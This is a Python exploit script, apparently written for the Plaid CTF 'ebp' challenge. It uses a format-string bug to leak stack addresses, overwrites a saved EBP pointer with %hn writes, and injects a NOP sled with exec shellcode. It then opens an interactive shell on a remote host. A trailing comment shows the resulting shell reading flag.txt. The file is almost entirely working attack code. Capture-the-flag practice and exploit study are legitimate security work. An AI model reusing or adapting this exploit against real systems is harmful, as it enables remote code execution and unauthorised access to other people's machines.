
from amnesia import *
import struct

# Plaid CTF
# amn3s1a - www.amn3s1a.com
# Nox - noxsoft.net

shellcode = amnesiaShell('exec').get()

p = lambda x : struct.pack('<L', x)

REMOTE = 1

port = 4545

if REMOTE:
	host = '52.6.64.173'

else:
	host = '127.0.0.1'

global s
s = amnesiaSock(host, port)

def read_stdout(i):
	s.writeLine(r'%'+str(i)+'$x')
	lk = s.read(1024).replace('\x0A', '')
	return int(lk, 16)



lk = read_stdout(4)
ptr_ebp = lk - 0x20
low_ptr_ebp = (ptr_ebp+0x4) & 0xFFFF

s.writeLine('%'+str(low_ptr_ebp)+'x%4$hn')


low_buff = (0x804A080+0x18) & 0xFFFF
payload = '%'+str(low_buff)+'x%12$hn.'
payload += 'A'*(len(payload)%4)
payload += '\x90'*0x10
payload += shellcode

#same functionality
'''
low_buf = 0x804A080 & 0xFFFF
payload = '\x90'*0x10
payload += shellcode
payload += '%'+str(low_buff-len(payload))+'x%12$hn'
'''

s.writeLine(payload)
s.interactive_shell()


'''
$ python xpl-ebp.py

ls 
ebp 
flag.txt 
id   
uid=1001(problem) gid=1001(problem) groups=1001(problem) 
cat flag.txt 
who_needs_stack_control_anyway? 
'''
